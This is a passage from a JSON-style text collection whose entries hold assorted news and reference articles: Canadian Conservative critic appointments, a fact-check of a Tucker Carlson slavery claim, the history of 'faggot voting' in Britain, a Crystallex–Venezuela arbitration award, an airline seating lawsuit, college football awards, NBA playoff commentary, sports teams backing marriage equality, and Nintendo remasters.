critic.\n\nTony Clement, who has virtually no international experience, having served as minister of health and president of the Treasury Board under Harper, will be the critic for foreign affairs.\n\nNew female face of conservatism\n\nBut Ambrose has also tapped some of the party's best communicators to handle the hottest files.\n\nLisa Raitt will slide into the finance portfolio, a clear demonstration that female MPs will be at the forefront of rebuilding the Conservative Party after its defeat.\n\nThe Milton MP managed to survive the Liberal wave that swept over much of the Greater Toronto Area in the last election. She also emerged as an early critic of the government's performance and tone under Harper after the electoral defeat. Her deft communications skills and ease with the media will be pertinent in such a high-profile portfolio.\n\nRaitt has already said a priority for the party is broadening its appeal among suburban women with children — voters like herself — a key demographic which jumped ship to Trudeau's Liberals.\n\nConservative MP Lisa Raitt responds to the naming of the Liberal cabinet 6:27\n\nMichelle Rempel, a staple on CBC's Power & Politics during the election campaign, will be the critic for the citizenship, immigration and refugees portfolio. The Tories have signalled that they have serious concerns about the prime minister's pledge to bring 25,000 Syrian refugees to Canada by the end of the year. Ambrose is pushing Trudeau to \"rethink\" the ambitious commitment and focus on national security considerations.\n\nErin O'Toole, who tried to turn things around at Veterans Affairs after a series of controversies under his predecessor, Julian Fantino, will take the lead on Public Safety and Emergency Preparedness.\n\nHe'll be up against a formidable opponent in the form of Ralph Goodale, a seasoned parliamentarian who has pledged to reform the Harper government's anti-terror legislation and bring about parliamentary oversight for the country's security agencies.\n\nInterim Conservative leader Rona Ambrose says now is not the time to retreat 1:53\n\nDianne Watts, the newly-elected MP for the riding of Surrey–White Rock, will be the critic for Infrastructure and Communities. One of the main planks of Trudeau's platform was a promise to jump-start the sluggish economy through massive infrastructure investment, and deficit spending.\n\nWatts, the former popular mayor of Surrey, B.C., and a rising star in the party, will keep an eye on the Liberals as they shovel billions of taxpayer dollars out the door.\n\nAmbrose, who will also be critic for the status of women, has carved out some new files, including a critic for matters relating to maternal, child and newborn health, to be handled by Alberta MP Mike Lake.\n\nWeaknesses exposed\n\nThe composition of the shadow cabinet also reveals some of the party's weaknesses after its defeat on Oct. 19. Wiped out in Atlantic Canada, Ambrose has recruited defeated MP Scott Armstrong to be their critic for the region. He will serve in that role from outside of Parliament.\n\nThe party's critic for urban affairs, John Brassard, hails from Barrie–Innisfill, a riding that is more than an hour north of Toronto.

  "latent_6048": "\"The United States ended slavery around the world, and maybe we should get some credit for that, too.\"\n\nFox News Channel’s Tucker Carlson said on his primetime talk show that while many are arguing for the removal of Confederate monuments because they legitimize slavery, America should get some recognition for stopping the practice globally.\n\nOn the Aug. 15, 2017, episode of Tucker Carlson Tonight, the host was discussing with political commentator Jasmyne Cannick whether former U.S. Sen Robert Byrd’s name should be removed from a building because Byrd was once a recruiter for the Ku Klux Klan.\n\nCannick said that offensive or racially insensitive monuments or dedications may be reviewed in time, but Americans should still remember to mark its history properly. Carlson affirmed her answer with a remark about the result of the Civil War.\n\n\"The United States ended slavery around the world, and maybe we should get some credit for that, too,\" he said.\n\nPresident Abraham Lincoln issued the Emancipation Proclamation in 1862, and the 13th Amendment formally abolished slavery in the United States after it was ratified following the end of the Civil War in 1865. But did that stop slavery across the planet? Experts told us there was no way that was true.\n\nBeyond the Civil War\n\nWe don’t know exactly how Carlson was defining slavery, whether as a government-sanctioned practice or criminal enterprise. We reached out to the show and to Fox News Channel but did not get a response.\n\nBut he’s not right in any case, historians told us.\n\nSlavery has been instituted by myriad cultures, empires and nations around the globe for centuries, they said. There have been patterns of abolishing slave trades and then the practice of slavery, before later reinstating them.\n\nIn the modern context, the roots of the abolitionist movement really began in Great Britain in 1787. The Society for the Abolition of the Slave Trade set the stage for organized, widespread protests against slavery.\n\n\"If anyone could lay claim to leading anti-slavery forces in the world it was Britain, which after it abolished the slave trade and slavery made anti-slavery a leading aspect of its foreign policy and policed the Atlantic to end the slave trade,\" University of Connecticut history professor Manisha Sinha said.\n\nThe British stopped its own trans-Atlantic slave trade in 1807, and America did the same a year later.\n\nVermont did become the first state to ban slaves in 1777, but it remained in practice among wealthy landowners into the 19th century. Other northern states also began to ban slavery, but the practice in the United States and abroad continued for far longer, eventually becoming the flashpoint of the Civil War.\n\nSeveral Western nations ended slavery before the United States did. Spain abolished it in 1811, although Cuba refused the royal decree. Sweden, the Netherlands, France and Portugal all banned the slave trade — but not the owning of slaves — shortly thereafter.\n\nThe British didn’t officially abolish slavery until 1833. Then other European powers began to follow suit.\n\nSeveral Latin American countries and a handful of other places like the principality of Moldovia banned slavery through the 1850s.\n\nFast forward to the 1860s, when the Confederate States of America’s surrender to Union forces dovetailed with the official end of slavery here. But that wasn’t the last word on slavery.\n\n\"The 13th Amendment abolished chattel slavery in the United States, but slavery continued in Cuba and Brazil until the 1880s, and in other places in the world well into the 20th century,\" Georgetown University history professor Adam Rothman said.\n\nSlavery and indentured servitude in Cuba finally ended in 1886, while Brazil stopped the official practice of slavery two years later. That’s still not the end of the story, however.\n\n\"Slavery still exists in most every corner of the world,\" Siddharth Kara, director of the Program on Human Trafficking and Modern Slavery at Harvard, told us. \"When people speak about the abolition of slavery, what they mean is the abolition of the legally sanctioned institution of buying and selling other people like property.\"\n\nBut forced labor continued, perpetrated by the likes of Nazis and the Soviet Union. Child labor and bonded labor, in which people must work to pay off debts, remains a problem, particularly in the Third World. The Associated Press won a Pulitzer Prize in 2016 for documenting cases of slavery in the seafood industry in Southeast Asia.\n\n\"The global campaign against modern slavery has been going on for a long time under the auspices of international anti-slavery NGOs and organizations like the U.N., which the U.S. participates in,\" Rothman said. \"But at the same time, it's likely that forms of unfree labor akin to slavery lurk in the dark shadows at the end of the global supply chains of American businesses.\"\n\nOur ruling\n\nCarlson said, \"The United States ended slavery around the world, and maybe we should get some credit for that, too.\"\n\nThe practice of treating other human beings as property that can be forced into labor continued as official policy for more than decades in Cuba and Brazil after the Civil War. Historians said slavery continued to exist across the world into the 20th century, and conditions comparable to slavery still exist.\n\nAny credit for originating the ideals leading to the end of slavery as most people would define it should go to the British, historians said, who formally organized abolitionist thought long before the United States adopted any official policy.\n\nWe rate Carlson’s statement Pants On Fire!",
  "latent_6078": "A faggot voter or faggot was a person who qualified to vote in an election with a restricted suffrage only by the exploitation of loopholes in the regulations. Typically, faggot voters satisfied a property qualification by holding the title to a subdivision of a large property with a single beneficial owner. Faggot voting was a common electoral abuse in the United Kingdom until the electoral reforms of the late 19th century. Faggot voting was abolished by the Representation of the People Act 1884.\n\nPolitical reform continued during the Victorian era, eventually leading to universal suffrage. The notion of faggot voting became an archaic curiosity and the term fell into disuse. It is now rarely mentioned.\n\nEtymology [ edit ]\n\nThe word faggot originally meant a piece or bundle of gathered firewood. It was later applied to civilians added to a military muster roll purely to make up the numbers rather than to serve as soldiers. The extension from muster rolls to electoral rolls is attested from 1817.[1] The use of the word in an electoral context has nothing to do with many other uses of the word, such as cuisine known as a faggot, faggotting in terms of knitting, and the more recently common sense of faggot as a pejorative for someone known as or perceived as homosexual, bisexual, or transgender.\n\nPractices [ edit ]\n\nIn the unreformed House of Commons, and for decades after the Reform Act 1832, the qualifications for voting varied between different constituencies. However in many constituencies, suffrage was restricted to those with an \"interest\" (i.e. in property) in the constituency, i.e. real estate. If a landowner subdivided a single property into multiple units, and transferred the title of each unit into the name of a separate person, each titleholder could then register to vote.[2] These \"faggot voters\" would generally vote according to the wishes of the original landowner. The lack of a secret ballot ensured that the \"faggot\" complied with the landowner's wishes. Prohibition of vote buying was difficult to enforce if the faggot was an employee of the landowner. There was no requirement for a voter to be resident in the constituency; the landowner and faggot voter might both reside outside the constituency.[2]\n\nAlthough the original forty shilling freehold suffrage of 1432 applied to freehold rather than leasehold, it had been widened gradually over the centuries, increasing the number of loopholes by which faggot voters might register.[2] Edward Porritt found the earliest instances of faggot voting in the 1620s under Charles I.[2] The Parliamentary Elections Act 1695 (7 & 8 Will. III c.25) prohibited subdivision of tenements for this purpose.[1] In the 18th century, a freehold would be conveyed to the faggot just before the election, and back again straight after the vote.[3]\n\nThe Sheriffs of the City of London are elected by the Liverymen of the Livery Companys. Richard Causton, himself an MP and liveryman, said in the debate on the Local Government Act 1888 that \"anyone who wanted a vote could go down to the City with £12 in his pocket, and get the right to vote ... There were liverymen who had no connection with the City beyond the fact that they were faggot voters\". His amendment to restrict the vote to \"men who had business in the City of London\" was defeated.[4]\n\nAbolition [ edit ]\n\nSubdivision of property other than to bona fide titleholders was prohibited for the franchise in borough constituencies by the Representation of the People Act 1867 and in county constituencies by the Representation of the People Act 1884. However, previously enrolled faggot voters retained their vote until death. This was rendered irrelevant by the Representation of the People Act 1918, which introduced manhood suffrage, and abolished virtually all property qualifications.\n\nSee also [ edit ]",

  "latent_6181": "World Bank: Venezuela To Pay $1.4 Billion For Protecting Lands\n\nAbove photo: Aerial view of gold mining at Imataca. http://www.airpano.com\n\nThe World Bank’s International Centre for Settlement of Investment Disputes (ICSID) has ordered the government of Venezuela to pay $1.386 billion to Crystallex, a bankrupt Canadian gold mining company, for canceling a 2002 permit to mine for gold in the Imataca Forest Reserve.\n\nCrystallex brought its arbitration claim to the ICSID in 2011 stating that Venezuela had violated the company’s rights guaranteed under a bilateral treaty between Canada and Venezuela.\n\nEven though most national courts refuse to hear community claims against companies for environmental or human rights abuses abroad, a number of international ‘arbitration’ courts routinely rule allow companies to sue governments for investment ‘rights’ written into new bilateral and multilateral treaties. (ICSID alone is currently hearing 211 cases)\n\nImataca, one of four major pristine forest reserves in the country, is home to the indigenous Akawaio, Arawako, Karina, Pemon and Warao peoples. It also sits above what geologists believe to be the largest gold deposits in the continent worth some $20 billion.\n\nIn recent years successive governments have extended environmental protection over most of the region but specifically excluded the gold mining area. This was despite regular protests by the indigenous communties to protect the area from environmental damage. “The forest is our home, our laboratory, our hospital, our university. It is the source of the knowledge we need to survive,” Jose Gonzales, the coordinator of the Federation of Indigenous People of the State of Bolivar, Venezuela, said in an international appeal almost 20 years ago.\n\nOver time, the area has been invaded by small scale diamond and gold miners who have destroyed almost a tenth of the forested area. For some 50 years, mining investors have also battled to gain access to two adjoining sites – Las Cristinas and Las Brisas – where they hope to use large scale open pit cyanide heap leach technology to extract the deep underground reserves of the precious metal.\n\nUnfortunately for the mining companies, every deal has quickly become mired in a series of legal or political disputes. At one point Placer Dome, a Canadian multinational, had a joint venture to dig for gold at Las Cristinas with state-owned Corporacin Venezolana de Guayana (CVG), which they sold off for just $50. Others like Chinese state investment company CITIC and Russian-Canadian miner Rusoro have also attempted to cut deals with Venezuela, only to ultimately fail.\n\nIn 2002, the government of Hugo Chavez handed the rights to mine for gold to Crystallex, but then in an about turn, decided to cancel the permit on environmental grounds in February 2011. Crystallex immediately filed an arbitration claim but was forced to declare bankruptcy later that year.\n\nEarlier this week, the World Bank ruled in favor of Crystallex awarding the company $1.2 billion plus almost $200 million in interest. “We are pleased that the Tribunal has recognized Venezuela’s unlawful expropriation of the company’s investment in the Las Cristinas mining project,” Robert Fung, Crystallex CEO said in a press release. “The company looks forward to collecting on the award on behalf of all of its stakeholders.”\n\nThe court decision marks yet another milestone in corporate victories against national governments using international trade treaties. For example in 2014 Kazakhstan was ordered to pay Stans Energy of Canada $118 million for a rare earths mine. And last year Mongolia was ordered to pay Khan Resources of Canada $70 million for the Dornod uranium project. And Venezuela was ordered to pay $740 million for canceling a permit issued by Gold Reserve Inc., also from Canada, for the Las Brisas mine.",

  "latent_6449": "An Australian man is suing American Airlines, alleging that he suffered serious injuries after being seated next to two passengers he claims were “grossly obese.”\n\nMichael Anthony Taylor, of Wollongong, New South Wales, was flying from Sydney, Australia to Los Angeles in December 2015—a 14-hour journey.\n\nTaylor was seated in the window seat of economy class and, according to court documents, two overweight passengers were seated in his row. According to the lawsuit, the body of the passenger next to Taylor “spilt over and encroached” upon his seat, forcing him to “contort his body into a series of positions including standing up, crouching, keeling and leaning forward,” report snews.com.au.\n\nARE AIRLINES FAT-SHAMING PASSENGERS?\n\nThough it’s been well over a year since the trip, Taylor, who suffered from a pre-existing spinal curvature, claims that he suffered even more severe back injuries and neck pain, arguing that the uncomfortable plane ride exacerbated his condition.\n\nTaylor’s lawyer, Thomas Jansen of Shine Lawyers, said his client asked the cabin crew if he could change seats but was reportedly denied re-accommodation requests multiple times.\n\n“Mr. Taylor asked the cabin crew on numerous occasions if he could sit in another passenger’s seat, or sit on one of the crew seats, or sit in the aisle or even to sit on the toilet seat to alleviate the pain and discomfort that he was suffering from,” Jansen told news.com.au. “On each occasion, he was refused and rebuffed.”\n\nAttendants were not able to reseat Taylor since U.S. federal regulations do not allow passengers to sit in crewmember jump seats. All 310 seats aboard the 777-300ER were occuppied by other passengers on Taylor's Dec. 28 flight.\n\nTaylor is seeking AUD $100,000 in damages (about $74,000). Jansen added that if his client is victorious, it could be a wakeup call for airlines to consider “how they’ve designed their seating and how they seat passengers.”\n\nFOLLOW US ON FACEBOOK FOR MORE FOX LIFESTYLE NEWS\n\n“I don’t hold any malice towards the people in the seats next to me. They’d paid for a ticket too,” Taylor told Sydney’s Daily Telegraph. “The airline could have put me in a crew seat or moved people around but they did nothing.”\n\nTaylor’s complaint comes amid rising concerns about increasingly cramped conditions and legroom on commercial aircrafts. This week, it was reported that American Airlines plans to reduce the size of seat pitches by two inches on its new 737 Max jetliner fleet to fit three extra rows on planes. The move will further maximize cabin capacity per flight.\n\nA spokesman for American Airlines told Fox News via email that the airline is aware of the suit, adding, \"We just received the lawsuit and we are reviewing the allegations.\"",
  "latent_6552": "OMAHA (FWAA) – Six semifinalists for the 2017 Outland Trophy – five offensive linemen and one defensive tackle – were announced on Thursday night during a reception hosted by the Greater Omaha Sports Committee. The Football Writers Association of America (FWAA), in a call of its 2017 All-America Committee, has determined the following six players as semifinalists for the award, in alphabetical order: Oklahoma offensive tackle Orlando Brown, Notre Dame offensive tackle Mike McGlinchey, Notre Dame offensive guard Quenton Nelson, Western Michigan offensive tackle Chukwuma Okorafor, Houston defensive tackle Ed Oliver and Ohio State center Billy Price. The field for the Outland Trophy, which is awarded to the best interior lineman in college football on offense or defense, will be reduced to three in the next week. Those finalists will be announced at 6:30 p.m. ET on Tues., Nov. 21, on The Home Depot College Football Awards Nomination Special on ESPNU. The winner of the 72nd Outland Trophy will be revealed on Thurs., Dec. 7, on ESPN during The Home Depot College Football Awards from the College Football Hall of Fame in Atlanta. Here is a closer look at each of the semifinalists: Orlando Brown, OT, Oklahoma (6-8, 345, Jr., Duluth, Ga.): The Sooners' team captain is a mainstay on the line, which triggers an explosive attack that leads the FBS in total offense (600.7 yards per game). The Sooners (9-1) are tops in the country in passing offense (388.8 yards) and No. 4 in the country in scoring (44.3 points per game). Brown was a second-team FWAA All-American last season and has started in all 36 games at left tackle since the beginning of the 2015 season. Mike McGlinchey, OT, Notre Dame (6-8, 315, Sr., Philadelphia, Pa.): Already with a degree at Notre Dame, McGlinchey is a stalwart on a Notre Dame line that produces 303.2 yards per game rushing (sixth-best in the country). The Fighting Irish (8-2) have scored 34 rushing touchdowns, third in the FBS. He has been the starting left tackle all 10 games this season for a Notre Dame team that has produced 12 100-yard individual rushing performances. Quenton Nelson, G, Notre Dame (6-5, 330, Sr., Holmdel, N.J.): Captain of the Fighting Irish, the starting left guard has been one of the top linemen for an offense that has rushed for 300 or more yards in seven of 10 games this season. His performance at guard has been ranked tops in the country by Pro Football Focus. Notre Dame averages 6.72 yards a rush, second-best in the FBS. Ed Oliver, DT, Houston (6-3, 290, So., Houston, Texas): Oliver was a second-team FWAA All-American last year as a freshman and was named to the FWAA's 2016 Freshman All-America Team. Despite drawing constant double- and triple-teams, he has an unusually high number of tackles for an interior lineman with 53 in just nine games. He has 10 tackles for 39 yards in losses (2.5 sacks for 13 yards in losses), three passes broken up, seven quarterback hurries, one fumble recovery, two forced fumbles and one blocked kick for the Cougars (6-3). Oliver is also a finalist for the FWAA's Bronko Nagurski Trophy, presented to the national defensive player of the year. Chukwuma Okorafor, OT, Western Michigan (6-6, 330, Sr., Southfield, Mich.): A three-year starter for the Broncos (6-4) who has been ranked as the No. 4 offensive tackle by Mel Kiper Jr. going into the 2018 NFL Draft. He played right tackle his first two seasons then moved to left tackle at the beginning of the 2016 season and has been a fixture there since. He has started every game the last three seasons for a productive offense. Billy Price, C, Ohio State (6-4, 312, Sr., Austintown, Ohio): Already in graduate school, Price has made a school-record 51 consecutive starts along the line for an offense that leads the country in first downs (281), is fifth in scoring offense (44.2 points per game) and third in total offense (546.5 yards per game). He has started every game (10) at center this season for the Buckeyes (8-2). He was a Distinguished Scholar during last spring semester with a perfect 4.0 grade-point average. The Outland Trophy, which has been awarded annually by the FWAA since 1946, is named after the late John Outland, an All-America lineman at the University of Pennsylvania in the late 1800s.

  "latent_6698": "Appearing on a Fox News broadcast just after the final speech of the 2012 Republican National Convention wrapped up, Republican author Ann Coulter said the high unemployment rate for American youths “makes me laugh and laugh and laugh” because so many young people supported President Barack Obama.\n\n“It’s the one very high, extraordinary unemployment rate that makes me laugh and laugh and laugh, ’cause they all voted for Obama,” she said.\n\nDespite an unemployment rate of 17.1 percent for young Americans ages 16-24, the U.S. Department of Labor said that 2.1 million more young people found work between April and July of this year, a significant increase in jobs numbers from the same period in 2011. Despite remaining persistently high, the youth unemployment rate is down from 2010’s all-time high of 19.6 percent.\n\n“It’s no secret that the effects of the 2007 recession had a significant impact on job prospects for youth, but today’s report showed positive signs that job prospects for young people picked up pace in 2012,” Labor Secretary Hilda Solis said in a media advisory.\n\nCoulter didn’t see it that way on Thursday night. “I think we ought to raise the voting age,” she added. “You can’t drink until you’re 21. We don’t have a draft anymore. Why are we letting infants vote? Their brains aren’t fully formed. They can’t even be responsible for their own health insurance until they’re 25.”\n\nFellow Fox News host Juan Williams added that Coulter once said something similar about women having the right to vote. And she did, too: Coulter told The New York Observer in 2007 that “it’s a personal fantasy of mine” to see the vote taken away from women, in which case “we’d never have to worry about another Democrat president.”\n\nPrior to the recession, which started in 2007 under President George W. Bush, youth unemployment was at about 11 percent. Federal Reserve Chairman Ben Bernanke said the recession was caused by a lapse in regulatory controls that allowed financial institutions to take on far more debt than they could support, ultimately triggering a wave of failures that nearly caused the global system of finance to collapse, which would have stopped the flow of credit and the issuance of cash to the general public.\n\nPresident Obama said in 2010 that that his economic policies prevented that “catastrophe” from happening. He’s since credited the Recovery Act with preventing another Great Depression, saying it created and saved more than 2 million jobs its first year.\n\nThis video was broadcast by Fox News on Thursday, August 30, 2012, as snipped by liberal media watchdog group Media Matters.",
  "latent_6717": "May 7, 2017; Houston, TX, USA; Houston Rockets guard James Harden (13) talks with media after game four of the second round of the 2017 NBA Playoffs against the San Antonio Spurs at Toyota Center. Mandatory Credit: Troy Taormina-USA TODAY Sports\n\nThe Houston Rockets made an embarrassing exit from the 2017 playoffs, putting them in a new, yet somewhat familiar position for the upcoming offseason.\n\nIt wasn’t supposed to end yet for the Houston Rockets, at least not like this.\n\nAs James Harden walked off the court for the final time Thursday night, shaking his teammates’ hands and hugging coaches, there was an all too familiar feeling that hung around the Toyota Center. For the few hundred fans that hadn’t already made their way to the exits, many of them dreaded the mere thought of the end of playoff basketball and the long summer that lay ahead.\n\nThe 2016-17 season was different for many reasons. And even in that, it was all the same.\n\nWhether you’re an accountant, a senator, a teacher or a even a carpenter, perception is everything. Since James Harden entered the league in 2009, his unique style of play and his beard have added to his aura and the attention he gathers. Of course most of it is beneficial, bringing much success on and off the court. But success is a two-edged sword, and world of basketball can be a very cruel and forgetful place.\n\nIf my calculations are correct, and according to my Imaginary Image Chart, James Harden has had to rebuild his public image 4 times now:\n\nafter last night’s game 6, he’s going to have to change the narrative again.\n\nThe first was after the 2012 Finals. The second was after the infamous “James Harden: NBA defender” YouTube video in 2014. The third time was after game 5 in the 2015 Western Conference Finals against the Warriors in which Harden went 2-11 to go along with 12 turnovers. The fourth time was after a 41-41 season, a first round exit, and a messy divorce with Dwight Howard in which he was portrayed as the bad guy.\n\nAnd after last night’s game 6, he’s going to have to change the narrative again. After a year in which he averaged 29-11-8, won 55 games, earned the three seed in the Western Conference, and will likely finish top-two in MVP voting. Basketball giveth, and basketball taketh away.\n\n“He looked like he was drugged out there for crying out loud, literally comatose,” Stephen A. Smith said on ESPN right after the game.\n\nNBA TV analyst Rick Kamla said he no longer believes Harden is a superstar. Max Kellerman, ESPN First Take anchor said he should still be a sixth man. Search the Twittersphere and you’ll come across hundreds of memes, jokes, and insults. That’s how quickly people’s opinions can change based off one game.\n\nDon’t get me wrong, game 6 was a 48 minute migraine. The Spurs literally came into Toyota Center without their best player in Kawhi Leonard and put a 40-point ass whooping on the Rockets. Yes, this isn’t the first rodeo (see Dallas/Houston 2005), but last night felt different. At times it looked like the Rockets didn’t want to even be on the court. They were second best to loose balls, offensive rebounds and just played outright sloppy.\n\nCredit to the Spurs–they are a fantastic organization. They proved this series why they deserve the title of dynasty. Losing Tony Parker and Leonard brought the team closer and put guys in positions to succeed. Jonathan Simmons, a former D-Leaguer, has played outstanding for Pop. Manu Ginobili looks about seven years younger, and LaMarcus Aldridge looked like he was in a Blazers uniform.\n\nEveryone counted San Antonio out after game 1, but Pop went back into his locker and pulled something from his secret coaching drawer, guarded by lock and key. Basketball draws frequent comparisons to chess, and Pop used a pawn to take D’Antoni’s knight.\n\nBut Houston beat itself. That’s the part they can’t get over. The Rockets were in it for three quarters in Game 3. And Game 5 was literally there for the taking, Houston had the ball with a three point lead with 90 some seconds to go in the game. Blame MDA and his 7-man rotation all you want, but it’s not like the Spurs went 12 deep in the series.\n\nGame 6 hurts, and it’s going to hurt for a long time.\n\nTrevor Ariza on Game 6: “That’s not going to be something you can forget. It’s always going to be there. That was terrible.\" — Jonathan Feigen (@Jonathan_Feigen) May 12, 2017\n\nThe feeling wasn’t just with the players though. D’Antoni’s most recent loss to Popovich surely will stick with him.\n\nD'Antoni: \"This will hurt us for awhile. It has to make us better next year.\" — Jonathan Feigen (@Jonathan_Feigen) May 12, 2017\n\nConsider this from TheUndefeated.com:\n\n“I really just didn’t have any rhythm from the beginning of the game,” Harden said postgame. “I felt like I was making some passes and we just didn’t knock down shots.”\n\n“It’s frustrating, especially with how great of a year that we had,” Harden said. “To end like that is frustrating. I beat myself up for it a little bit. I can’t dwell on it too long.”\n\nYou catch that? “I beat myself up for a little bit”.\n\nJames Harden made his campaign slogan this year all about playing as much as possible and not wanting to take a rest, sit a game or two out. Maybe he should have. LeBron James sat out games unapologetically and the Cavs are 8-0 and firing on all cylinders. Perhaps Harden’s fatigue simply caught up to him.\n\nYou don’t need advanced stats to see that Harden’s production dipped in the postseason, assists going from 11.2 to 8.5, three-point shooting fell to an abysmal 27.8 percent, and his overall calling card of efficiency dropped.\n\nD’Antoni, together with GM Daryl Morey, essentially gave the team the green light to shoot from deep. Let it fly. When it works, the Rockets are a sight to see and very difficult to beat. But Harden fell too in love with the three pointer himself.\n\nLook at his 3PT Rate (percentage of total shots that are threes) during the regular season compared to the playoffs since the 2014-15 season:\n\n2014-15: .378 regular season, .364 playoffs\n\n2015-16: .406 regular season, .420 playoffs\n\n2016-17: .493 regular season, .528 playoffs (!!!!!)\n\nNow this would be perfectly fine if he were the Ray Allen, the Kyle Korver or the J.J. Redick of the team. But James was shooting all these threes with less than 30 percent accuracy. And a lot of them were contested looks early in the shot clock, where running a play would have done much better.\n\nThe loss of Nene hurt Houston as well–his groin injury left a noticeable void at center and he had been key on the defensive end of the floor. His physical play with Pau Gasol and Aldridge was part of the reason why Houston had won two games. Patrick Beverley, for all his intensity and grit, is not 6’10”, 280 pounds.\n\nOnce MDA moved Trevor Ariza to the four and Ryan Anderson to backup center, Aldridge had a field day getting literally whatever he wanted offensively. The Rockets could and very well should have won this series, but Spurs gonna Spur.\n\nAll things considered however, Houston had a great year and exceeded expectations. Experts and basketball minds alike had them finishing towards the bottom of the West, not contending for a title. Houston can’t just pat themselves on the back now because they proved everyone wrong. The question now becomes, where do they go from here? How can they take that next step?\n\nI think rim protection is a perfect place to start. In the last three games with the Spurs, the Rockets gave up 62, 56 and 62 points in the paint. It was a layup line at times, way too easy for San Antonio to punish them inside. Houston can improve internally, given that it was Clint Capela‘s first full season and he made positive strides towards a fruitful career.\n\nCapela said his primary goal is to keep getting stronger, bigger. \"As I work, as I get stronger, will define as the team is going to be.\" — Jonathan Feigen (@Jonathan_Feigen) May 12, 2017\n\nWith regards to the free agent big man market, the Houston Rockets should give Greg Monroe a serious look. He would provide inside scoring as a low post threat to go along with solid rim protection. Nerlens Noel looks like he’s set to stay a Maverick, but Dewayne Dedmon and JaVale McGee could be seen as options as well. Nene’s best position is the backup 4 where he can utilize his midrange game, playing beside a true center.\n\nHouston projects to have around $12 million in cap space to play with. For all the money they gave to Ryan Anderson, he came up pretty short in the postseason, shooting a woeful 12 percent from downtown at home. If they choose to move on from him and can find a suitable buyer, that adds several million dollars potentially to improve the squad.\n\nBringing in some defensive specialists like P.J. Tucker or Serge Ibaka would be ideal–perhaps a trade could take place with Toronto. The Rockets could use some grit and grind. April, May and June should be the goal when team building a contender.\n\nMorey spoke about the idea of bringing in ball handling help for whenever Harden is on the bench. Last time they tried that experiment, the Ty Lawson fiasco blew up in their faces, so hopefully they’ve done their homework.\n\nHouston still has Troy Williams and Sam Dekker to continue to develop. If Dekker can find a consistent jumper, the Rockets have two 6’8″ 3-and-D swingmen ready to come in and contribute.\n\nWe live in a Daryl Morey world, so there’s always the chance that he might bring something in from left field a la Paul Millsap, Blake Griffin, Paul George or Gordon Hayward.\n\nEven after such a disappointing (yet not all that unpredictable) exit, there are good feelings about Houston’s future. All and all, the Houston Rockets have a very young and flexible roster with James Harden running the show and a summer full of hope and possibilities. We just don’t know what the offseason will bring us. And that, in a sense, is familiar unfamiliarity.\n\nStats courtesy of basketball-reference.com.",

Their supporters club, the Timbers Army, are self-described as “setting the bar” for soccer fandom in America.\n\n“It was just the right thing to do, at the right time.”\n\nIn October 2013, Timbers owner Merritt Paulson and COO Mike Golub decided to test the strength of that influence, and potentially put the team’s reputation on the line with their fans, when they publicly announced the team’s support (as well as the support of their sister team, the Thorns — a pro women’s soccer club also owned by Paulson) for an Oregon ballot measure to legalize same-sex marriage. The organization didn’t simply support the initiative, they explicitly called on fans to turn out and vote for the marriage equality measure. (A suit in U.S. district court found Oregon’s gay marriage ban violated the Equal Protection Clause of the Fourteenth Amendment, preempting the need to put the measure on the ballot.)\n\nWeekend Caucus spoke to Mike Golub about what prompted the Timbers to take this historical action, at the risk of alienating some of the Timbers’ fan base and others in the League. He said, rather modestly, that\n\n“It was just the right thing to do, at the right time.”\n\nThe impact, however, was anything but modest. Within a week, the Portland Trail Blazers followed suit, becoming the first NBA team to publicly support marriage equality — thanks in large part to the Timber’s own ‘trail blazing.’\n\nIn the months that followed, particularly leading up to the Supreme Court hearing on gay marriage in April 2015, several NFL and MLB teams publicly came out in support of same-sex marriage — with the notable inclusion of the reigning Super Bowl champs (the New England Patriots) and World Series champs at the time (the San Francisco Giants).\n\nWhile we can’t know if the Timbers’ and subsequently other major sports franchises’ actions impacted the Supreme Court decision to legalize gay marriage, there is reason to believe it influenced the fans.\n\nfacebook.com\n\nAthletes’ Influence\n\nA recent research study found that sports fans are disproportionately influenced by the political positions of professional athletes, compared with regular Joes or even other types of celebrities.\n\nThe study explained that:\n\n“When fans learn — sometimes unexpectedly — that other fans or athletes are supporters of marriage equality, they are motivated to agree” because this helps to “normalize their membership in those sports-fan groups.”\n\nThe bottom line? — Sports fans are 16% more likely to support gay marriage when they’ve been told a pro athlete supports it.\n\nAshland Johnson is a lawyer by training. We spoke with her about the impact of major sports teams speaking out for marriage equality. As the Director of Public Education and Research for the Human Rights Campaign, America’s largest advocacy organization for LGBTQ equality, she felt strongly that an attitude shift among the general public was a critical precursor to the positive Supreme Court decision in 2015:\n\n“It’s very rare for the Supreme Court to make a decision that is ahead of society’s hearts and minds on the issue, so when we’re trying to promote LGBTQ equality, a lot of the work we have to do is just changing people’s perspectives on the broader scale.”\n\nWithout the Portland Timbers speaking out, other professional sports teams would have been less likely to take a public stance. And when sports teams speak out — that changes people’s perspectives in a way that Johnson says is fundamental to achieving broader social and legal change.\n\nIn fact, the HRC’s experience confirms what the researchers found in their study — that pro athletes have a unique ability to impact mainstream perspectives on LGBTQ issues. Johnson told Weekend Caucus how important it has been for the HRC to involve athletes in their education and advocacy strategies:\n\n“Our society relates to sports. We identify with the athletes in another way. We’re emotionally invested in what’s going on. When an athlete speaks out for LGBTQ equality, it reaches a much broader audience.”",

  "latent_7161": "Hey Nintendo, You Should Make More HD Remastered Games for Wii U\n\nAs with a lot of things, Nintendo was late to the party with HD remasters; while Sony introduced the God of War Collection in 2009, it wouldn't be until late 2013 that we would see The Legend of Zelda: The Wind Waker HD. That delay in response would be partially made up for by Wind Waker HD being arguably the best remaster the world has ever seen, but the point still stands that while Sony has introduced dozens of remasters and collections, Nintendo has missed a golden opportunity.\n\nHD remasters have so many benefits for not only gamers, but developers as well. In Wind Waker HD's case, myself and many others would have likely never experienced one of Nintendo's best games in history if it didn't exist. Also, the visual and gameplay improvements made a legendary game even better. The original title was able to secure 96 Metascore rating, and earn a ton of love from Zelda fanatics. However, Wind Waker HD would perform miracles to one of the GameCube's most highly-regarded games.\n\nWind Waker HD improved a ton of things unrelated to the visual experience, including the removal of sailing bump-off, awkward rope handling, the addition of a Deku Leaf indicator, and much more. Then there was the obvious upgrade in visual fidelity. The original experience ran at an unbelievably low 480p—it was normal at the time. At 1080p with crystal clear environments and characters, its HD version was the most immersive Zelda game yet. Without it, the wait until The Legend of Zelda Wii U would be absolutely brutal.\n\nRemastering a game requires a lot less investment than developing an entirely new name. A studio doesn't have to draw up a new setting, compelling mechanics, and write a ton of dialog; they get to work with what already exists and polish it up. For that reason a game like Wind Waker HD is highly profitable, and could potentially have an even better outlook than something big and new like Mario Kart 8. It's currently sitting at around the one million mark, and will certainly benefit from prospective Wii U customers.\n\nSo yes, we 